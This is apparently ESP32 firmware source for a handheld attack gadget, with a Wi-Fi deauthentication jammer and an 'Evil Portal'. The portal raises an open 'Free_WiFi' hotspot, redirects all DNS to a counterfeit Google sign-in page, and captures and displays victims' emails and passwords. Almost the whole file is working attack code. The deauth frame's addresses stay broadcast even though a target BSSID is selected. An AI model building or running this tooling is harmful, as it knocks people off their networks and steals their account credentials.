#include "attacks.h"
#include "ui.h"
#include "utils.h"

// ─── Frame deauth IEEE 802.11 ───────────────────────────────
const uint8_t DEAUTH_FRAME[26] = {
  0xC0, 0x00,                         // frame control: deauth
  0x00, 0x00,                         // duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination: broadcast
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // source: broadcast
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID: broadcast
  0x00, 0x00,                         // seq
  0x07, 0x00                          // reason: class3 not assoc
};

// ─── Evil Portal HTML ───────────────────────────────────────
static const char EVIL_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Sign in - Google Accounts</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Roboto',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
    .card{width:360px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
    .logo{text-align:center;margin-bottom:16px;font-size:28px;color:#4285F4;font-weight:500}
    h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:8px}
    h2{font-size:16px;font-weight:400;text-align:center;color:#202124;margin-bottom:28px}
    input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:14px;outline:none}
    input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
    .hint{font-size:14px;color:#5f6368;margin-bottom:24px}
    .hint a{color:#1a73e8;text-decoration:none}
    .actions{display:flex;justify-content:space-between;align-items:center}
    .create{color:#1a73e8;text-decoration:none;font-size:14px}
    button{background:#1a73e8;color:#fff;border:none;padding:0 24px;height:36px;border-radius:4px;font-size:14px;cursor:pointer}
    button:hover{background:#1765cc}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">G</div>
    <h1>Sign in</h1>
    <h2>with your Google Account</h2>
    <form method="GET" action="/get">
      <input name="email"    type="text"     placeholder="Email or phone"     required autocomplete="off">
      <input name="password" type="password" placeholder="Enter your password" required autocomplete="off">
      <div class="hint">Not your computer? <a href="#">Use Guest mode</a></div>
      <div class="actions">
        <a class="create" href="#">Create account</a>
        <button type="submit">Next</button>
      </div>
    </form>
  </div>
</body>
</html>
)rawliteral";

// ════════════════════════════════════════════════════════════
//  Sous-menu WiFi Attack
// ════════════════════════════════════════════════════════════
void attacks_wifiSubMenu() {
  static const MenuItem SUB[2] = {
    { "Deauth Attack", "W>" },
    { "Evil Portal",   "EP" },
  };
  int sel = 0;

  while (true) {
    ui_drawMenu(SUB, 2, sel);

    if (utils_btnA()) {
      if (sel == 0) attacks_deauthScan();
      else          attacks_evilPortal();
      return;
    }
    if (utils_btnB()) {
      sel = (sel + 1) % 2;
    }
    delay(20);
  }
}

// ════════════════════════════════════════════════════════════
//  Deauth Attack
// ════════════════════════════════════════════════════════════
static void _drawNetList(int n, int sel, int pageStart) {
  ui_begin();
  ui_topbar("DEAUTH ATTACK", "Select Target");
  ui_botbar("Attack!", "Next");

  const int ITEM_H = 20;
  const int VIS    = 5;
  const int startY = UI_CONTENT_Y + 2;

  for (int i = pageStart; i < pageStart + VIS && i < n; i++) {
    int y   = startY + (i - pageStart) * ITEM_H;
    bool hl = (i == sel);

    if (hl) {
      spr.fillRect(0, y, SCREEN_W, ITEM_H - 1, accent());
    } else {
      spr.fillRect(0, y, SCREEN_W, ITEM_H - 1, (i % 2 == 0) ? C_DARK : C_BLACK);
    }

    // SSID
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "(Hidden)";
    if (ssid.length() > 18)  ssid = ssid.substring(0, 17) + "~";

    spr.setTextDatum(TL_DATUM);
    spr.setTextSize(1);
    spr.setTextColor(hl ? C_BLACK : C_WHITE, hl ? accent() : C_DARK);
    spr.drawString(String(i + 1) + ". " + ssid, 6, y + 5);

    // Channel + RSSI à droite
    char info[16];
    sprintf(info, "Ch%d %ddBm", WiFi.channel(i), WiFi.RSSI(i));
    spr.setTextDatum(TR_DATUM);
    spr.setTextColor(hl ? C_BLACK : C_LGRAY, hl ? accent() : C_DARK);
    spr.drawString(info, SCREEN_W - 4, y + 5);
  }

  // Scrollbar
  int sbH = VIS * ITEM_H;
  spr.fillRect(SCREEN_W - 2, UI_CONTENT_Y + 2, 2, sbH, C_DARK);
  int thumb = sbH * VIS / n;
  int tPos  = sbH * pageStart / n;
  spr.fillRect(SCREEN_W - 2, UI_CONTENT_Y + 2 + tPos, 2, thumb, accent());

  ui_push();
}

void attacks_deauthScan() {
  // Écran de scan
  ui_begin();
  ui_topbar("DEAUTH ATTACK", "Scanning...");
  ui_botbar(nullptr);
  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(2);
  spr.setTextColor(accent(), C_BLACK);
  spr.drawString("Scanning WiFi...", SCREEN_W / 2, SCREEN_H / 2 - 10);
  spr.setTextSize(1);
  spr.setTextColor(C_GRAY, C_BLACK);
  spr.drawString("Please wait", SCREEN_W / 2, SCREEN_H / 2 + 12);
  ui_push();

  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();

  if (n <= 0) {
    ui_begin();
    ui_topbar("DEAUTH ATTACK");
    ui_bigText("No Networks Found", SCREEN_H / 2, C_GRAY, 2);
    ui_botbar("Back");
    ui_push();
    utils_waitBtn(PIN_BUTTON_A);
    return;
  }

  int target = attacks_selectNetwork(n);

  // Confirmation
  ui_begin();
  ui_topbar("ATTACKING", WiFi.SSID(target).c_str());
  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(1);
  spr.setTextColor(C_LGRAY, C_BLACK);
  spr.drawString("Target BSSID:", SCREEN_W / 2, UI_CONTENT_Y + 20);
  spr.setTextColor(danger(), C_BLACK);
  spr.setTextSize(1);
  // BSSID
  char mac[20];
  uint8_t* bssid = WiFi.BSSID(target);
  sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  spr.drawString(mac, SCREEN_W / 2, UI_CONTENT_Y + 36);
  ui_botbar("Stop", nullptr);
  ui_push();
  delay(1500);

  // Attaque continue
  int ch = WiFi.channel(target);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_max_tx_power(78);

  uint32_t count   = 0;
  uint32_t lastUpd = millis();
  uint32_t startT  = millis();

  while (!utils_btnA()) {
    esp_wifi_80211_tx(WIFI_IF_STA, DEAUTH_FRAME, sizeof(DEAUTH_FRAME), false);
    count++;

    if (millis() - lastUpd >= 150) {
      lastUpd = millis();
      uint32_t elapsed = (millis() - startT) / 1000;

      ui_begin();
      ui_topbar("ATTACKING", WiFi.SSID(target).c_str());

      // Cercle pulsant
      static int pulse = 0;
      pulse = (pulse + 1) % 20;
      spr.drawCircle(SCREEN_W / 2, SCREEN_H / 2 - 10, 30 + pulse, danger());
      spr.drawCircle(SCREEN_W / 2, SCREEN_H / 2 - 10, 20,         danger());

      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(2);
      spr.setTextColor(danger(), C_BLACK);
      spr.drawString("JAMMING", SCREEN_W / 2, SCREEN_H / 2 - 10);

      // Stats
      char statBuf[32];
      sprintf(statBuf, "%lu pkts  |  %lus", count, elapsed);
      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      spr.drawString(statBuf, SCREEN_W / 2, SCREEN_H / 2 + 20);

      ui_botbar("Stop");
      ui_push();
    }
    delay(1);
  }

  WiFi.scanDelete();
  ui_toast("Attack stopped", accent());
}

int attacks_selectNetwork(int n) {
  int sel       = 0;
  int pageStart = 0;
  const int VIS = 5;

  while (true) {
    // Recalc page
    pageStart = sel - VIS / 2;
    if (pageStart < 0)           pageStart = 0;
    if (pageStart + VIS > n)     pageStart = max(0, n - VIS);

    _drawNetList(n, sel, pageStart);

    if (utils_btnA()) return sel;
    if (utils_btnB()) sel = (sel + 1) % n;
    delay(20);
  }
}

// ════════════════════════════════════════════════════════════
//  Evil Portal
// ════════════════════════════════════════════════════════════
static String ep_lastEmail;
static String ep_lastPass;
static bool   ep_gotCreds = false;

static void _handleRoot() {
  httpServer.send_P(200, "text/html", EVIL_PORTAL_HTML);
}

static void _handleGet() {
  ep_lastEmail = httpServer.arg("email");
  ep_lastPass  = httpServer.arg("password");
  ep_gotCreds  = true;
  httpServer.send(200, "text/html",
    "<html><body style='font-family:Roboto;text-align:center;margin-top:60px'>"
    "<h2>Verifying your account...</h2><p>Please wait.</p></body></html>");
}

static void _handleNotFound() {
  IPAddress ip = WiFi.softAPIP();
  httpServer.sendHeader("Location", String("http://") + ip.toString(), true);
  httpServer.send(302, "text/plain", "");
}

void attacks_evilPortal() {
  const char* AP_SSID = "Free_WiFi";
  ep_gotCreds = false;

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  IPAddress apIP = WiFi.softAPIP();

  dnsServer.start(DNS_PORT, "*", apIP);
  httpServer.on("/",    _handleRoot);
  httpServer.on("/get", _handleGet);
  httpServer.onNotFound(_handleNotFound);
  httpServer.begin();

  uint32_t capCount = 0;

  while (!utils_btnA()) {
    dnsServer.processNextRequest();
    httpServer.handleClient();

    if (ep_gotCreds) {
      capCount++;
      ep_gotCreds = false;

      // Afficher les creds capturés
      ui_begin();
      ui_topbar("EVIL PORTAL", "Credentials!");
      ui_card(10, UI_CONTENT_Y + 4, SCREEN_W - 20, 50, danger());

      spr.setTextDatum(TL_DATUM);
      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_DARK);
      spr.drawString("Email:", 16, UI_CONTENT_Y + 10);
      spr.setTextColor(C_WHITE, C_DARK);
      spr.drawString(ep_lastEmail.substring(0, 32), 16, UI_CONTENT_Y + 22);
      spr.setTextColor(C_LGRAY, C_DARK);
      spr.drawString("Pass:", 16, UI_CONTENT_Y + 34);
      spr.setTextColor(accent(), C_DARK);
      spr.drawString(ep_lastPass.substring(0, 32), 16, UI_CONTENT_Y + 46);

      char capBuf[20]; sprintf(capBuf, "Total captures: %lu", capCount);
      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(1);
      spr.setTextColor(C_GRAY, C_BLACK);
      spr.drawString(capBuf, SCREEN_W / 2, UI_CONTENT_Y + 70);

      ui_botbar("Stop");
      ui_push();
      delay(4000);
    } else {
      // Écran idle
      ui_begin();
      ui_topbar("EVIL PORTAL", "Running");

      spr.setTextDatum(MC_DATUM);
      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      spr.drawString("SSID:", SCREEN_W / 2, UI_CONTENT_Y + 16);
      spr.setTextSize(2);
      spr.setTextColor(accent(), C_BLACK);
      spr.drawString(AP_SSID, SCREEN_W / 2, UI_CONTENT_Y + 30);

      spr.setTextSize(1);
      spr.setTextColor(C_LGRAY, C_BLACK);
      char capBuf[22]; sprintf(capBuf, "Captures: %lu", capCount);
      spr.drawString(capBuf, SCREEN_W / 2, UI_CONTENT_Y + 55);

      // IP
      spr.setTextColor(C_GRAY, C_BLACK);
      spr.drawString(apIP.toString().c_str(), SCREEN_W / 2, UI_CONTENT_Y + 68);

      // Indicateur actif (point clignotant)
      static bool blink = false; blink = !blink;
      spr.fillCircle(SCREEN_W - 16, UI_CONTENT_Y + 10, 4, blink ? C_GREEN : C_DARK);

      ui_botbar("Stop");
      ui_push();
      delay(300);
    }
  }

  httpServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  delay(300);
  ui_toast("Portal stopped", accent());
}

// ════════════════════════════════════════════════════════════
//  BLE Attack (placeholder amélioré)
// ════════════════════════════════════════════════════════════
void attacks_bleMenu() {
  ui_begin();
  ui_topbar("BLE ATTACK", "Coming Soon");

  spr.setTextDatum(MC_DATUM);
  spr.setTextSize(2);
  spr.setTextColor(C_GRAY, C_BLACK);
  spr.drawString("BLE Flood", SCREEN_W / 2, SCREEN_H / 2 - 14);
  spr.setTextSize(1);
  spr.setTextColor(C_LGRAY, C_BLACK);
  spr.drawString("Feature in development", SCREEN_W / 2, SCREEN_H / 2 + 10);
  spr.drawString("v2.1 planned", SCREEN_W / 2, SCREEN_H / 2 + 24);

  ui_botbar("Back");
  ui_push();
  utils_waitBtn(PIN_BUTTON_A);
}
